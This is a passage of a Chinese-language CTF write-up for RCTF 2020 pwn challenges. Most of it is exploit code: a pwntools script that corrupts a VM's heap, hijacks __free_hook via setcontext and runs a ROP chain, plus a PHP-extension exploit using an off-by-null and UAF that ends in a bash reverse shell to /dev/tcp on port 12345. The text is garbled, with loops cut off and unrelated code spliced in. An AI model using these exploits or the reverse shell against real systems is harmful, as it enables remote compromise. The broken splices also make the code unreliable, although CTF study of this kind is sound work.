    if debug:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./vm')
    else:
        libc = ELF('./x64_libc.so.6')
        p = remote('f.buuoj.cn',20173)
    def SetReg(offset,val):
        idx = offset / 8
        payload = p8(4)+p8(1)+p8(idx)+p64(val)
        return payload
    def SetRegLibcHeap(offset,val,base_reg=2):
        p = SetReg(offset,val)
        p += p8(0)+p8(0)+p8(offset/8)+p8(base_reg)
        return p
    def exp(idx):
        #leak libc
        p.recvuntil("give me your code: ")
        payload = p8(0x0c)+p8(0xfc)
        payload += p32(0)*62
        payload += p32(0xffffffff)
        #overwrite the heap's size and free it
        #payload += p8(4)+p8(1)+p8(11)+p64(0x00000ffffffffff)
        #mov data_chunk's size to rsp
        #reg[8] = data_chunk+8
        payload += p8(1)+p8(1)+p8(8)+p64(0x808)
        #reg[0] = 0x711
        payload += p8(4)+p8(0x1)+p8(0)+p64(0x421)
        #*reg[8] = reg[0]
        payload += p8(4)+p8(0x20)+p8(8)+p8(0)
        #reg[8] = data_chunk+0x410
        payload += p8(0)+p8(1)+p8(8)+p64(0x8+0x418)
        #reg[1] = 0x3f1
        payload += p8(4)+p8(1)+p8(1)+p64(0x3f1)
        #*reg[8] = 0x3f1
        payload += p8(4)+p8(0x20)+p8(8)+p8(1)
        #free data_chunk
        payload += p8(13)+p64(0x410)
        #reg[8] = data_chunk
        payload += p8(1)+p8(1)+p8(8)+p64(0x96f0-0x92e0)
        #reg[9] = data_chunk_addr
        payload += p8(1)+p8(1)+p8(9)+p64(0x00005555557596f0-0x5555557582a0)
        payload += p8(0x4)+p8(0x10)+p8(2)+p8(9)
        #now we have libc addr
        #reg[2] = main_arena+96
        off_free_hook_arena = libc.sym['__free_hook'] + 8 - 96 - 0x10 - libc.sym['__malloc_hook']
        #reg[2] = __free_hook
        payload += p8(0)+p8(1)+p8(2)+p64(off_free_hook_arena)
        #reg[3] = main_arena+96
        payload += p8(4)+p8(0x10)+p8(3)+p8(9)
        #reg[3] = setcontext+53
        off_main_arena_setcontext = libc.sym['__malloc_hook'] + 0x10 + 96 - libc.sym['setcontext'] - 53
        #reg[3] = setcontext+53
        payload += p8(1)+p8(1)+p8(3)+p64(off_main_arena_setcontext)
        #_rsp = free_hook
        payload += p8(4)+p8(8)+p8(8)+p8(2)
        #[free_hook] = setcontext+53
        payload += p8(0xa)+p8(0)+p8(3)
        #set rops in heap
        #reg[2] = libc_base
        payload += p8(1)+p8(1)+p8(2)+p64(libc.sym['__free_hook']+8)
        #recover heap
        payload += p8(0)+p8(1)+p8(9)+p64(0x3d0)
        #set rops
        #set rdi = flag_addr
        payload += p8(0)+p8(1)+p8(0xa)+p64(0x1100-0x108)
        #mov flag_addr to +0x68
        payload += p8(4)+p8(8)+p8(0x68/8)+p8(0xa)
        add_rsp_0x10_p = 0x000000000003f24d
        #0x000000000003f24d : add rsp, 0x10 ; pop rbx ; ret
        #set rip = below
        payload += SetReg(0xa8,add_rsp_0x10_p)
        payload += p8(0)+p8(0)+p8(0xa8/8)+p8(2)
        #set rsp = sth
        payload += p8(1)*2+p8(0xa)+p64(0x1100-0x108-0x90)
        payload += p8(4)+p8(8)+p8(0xa0/8)+p8(0xa)
        #set rsi = 0
        payload += SetReg(0x70,0)
        #set other rops
        p_rdi = 0x000000000002155f
        p_rsi = 0x0000000000023e6a
        p_rdx = 0x0000000000001b96
        p_rax = 0x00000000000439c8
        syscall = 0x00000000000d2975
        leave = 0x0000000000054803
        p_rsp = 0x0000000000003960
        start_offset = 0x118
        mov_rdi_gadget = 0x00000000000520e9
        #0x00000000000520e9 : mov rdi, qword ptr [rdi + 0x68] ; xor eax, eax ; ret
        rops = [
                p_rax,2,
                syscall,
                p_rdi,0,
                p_rsi,libc.sym['__malloc_hook']+0x100,
                p_rdx,0x20,
                p_rax,0,
                syscall,
                p_rdi,libc.sym['__malloc_hook']+0x100+idx-0x68,
                mov_rdi_gadget,
                libc.sym['exit']
                ]
        for i in range(len(rops)):
            if rops[i] This.u2.next, "sl", &content) )
      {
        php_printf("Edit Argument Error.n");
        return_value->u1.type_info = 1;
      }
      else if ( my_ext_globals.notes[0] )
      {
        strcpy(my_ext_globals.notes[0], content);   // off-by-null
      }
      else
      {
        php_printf("idx: %d, ptr:%p");
        php_printf("Index Errorn");
        return_value->u1.type_info = 1;
      }
    }
    //
    void __cdecl zif_ttt_backdoor(zend_execute_data *execute_data, zval *return_value)
    {
      void *(*volatile v2)(void *, size_t, const void *); // rdx
      __int64 noteidx; // [rsp+10h] [rbp-10h]
      unsigned __int64 v4; // [rsp+18h] [rbp-8h]
      v4 = __readfsqword(0x28u);
      if ( (unsigned int)zend_parse_parameters(execute_data->This.u2.next, "l", &noteidx) )
      {
        php_printf("ARGS ERROR.n");
        return_value->u1.type_info = 1;
      }
      else
      {
        v2 = _realloc_hook;
        if ( v2 == (void *(*volatile )(void *, size_t, const void *))'tinwpttt' )// tttpwnit
        {
          php_printf("get shell %d.n");
          system(my_ext_globals.notes[noteidx]);
        }
      }
    }
###  漏洞利用
首先得搭建本地的调试环境，远程应该是apache起的php，我本地无法完全模拟，只能用目标版本的php进行近似模拟。这里我参考的是[WEBPWN入门级调试讲解](https://www.anquanke.com/post/id/204404)，原文作者讲的很详细，在把扩展库文件放到指定目录并修改配置文件后就可以加载这个库了，直接`gdb
php`，因为有符号所以直接用函数名下断点就好，`set args ./pwn.php`设置输入文件。
利用方面，我们使用`strcpy`的`off-by-null`构造chunk
overlapping，泄露libc，然后UAF分配到`__realloc_hook`写。  
这里有一些需要注意的地方，edit因为只能使用strcpy我们在覆写fd之后需要几次strcpy来还原chunk的size部分。此外考虑到远程的条件更为复杂，我们先将用到的堆块进行多次分配使用完毕堆中的空闲堆块，使得堆布置成我们理想的状态。分配堆块使用的是calloc，我们不能选择太大的堆块，否则会破坏realloc_hook后面不远处的main_arena+88处的top_chunk，可能引起崩溃，但是堆块太小似乎又有可能被其他进程迅速拿走(这里不确定)，我们选择尽量大一点的来进行UAF。
###  exp.php
    function rev_hex($input) {
        $e = strlen($input) - 2;
        $r = '';
        while ($e >= 0) {
            $r .= $input[$e] . $input[$e+1];
            $e -= 2;
        }
        return $r;
    }
    for($i=0;$i/dev/tcp/*.*.*.*/12345 0>&1'";
    ttt_edit($exp,13);
    ttt_backdoor(13);
    '''
## 参考
[RCTF 2020 WP](http://q1iq.top/RCTF-wp/)
[RCTF官方writeup](https://blog.rois.io/2020/rctf-2020-official-writeup/)